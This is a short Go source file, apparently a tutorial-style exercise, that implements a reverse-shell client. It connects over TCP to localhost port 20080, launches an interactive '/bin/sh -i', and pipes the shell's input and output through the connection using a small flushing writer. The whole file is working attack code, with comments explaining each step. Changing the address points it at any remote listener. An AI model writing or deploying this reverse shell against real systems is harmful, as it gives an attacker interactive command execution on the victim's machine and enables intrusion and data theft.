package main

import (
	"net"
	"log"
	"fmt"
	"os/exec"
	"io"
	"bufio"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (flush *Flusher) Write(b []byte) (int, error) {
	count, err := flush.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := flush.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

// Establish connection to remote listener via net.Dial(network, address string)
func client() {
	address := fmt.Sprintf("localhost:%d", 20080)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatalln("Unable to connect")
	}

	// Initialize Cmd via exec.Command(name string, arg ..string)
	cmd := exec.Command("/bin/sh", "-i")

	// Redirect Stdin and Stdout properties to utilize net.Conn
	cmd.Stdin = conn
	cmd.Stdout = NewFlusher(conn)

	// Run command
	cmd.Run()
	conn.Close()
}

func main() {
	client()
}



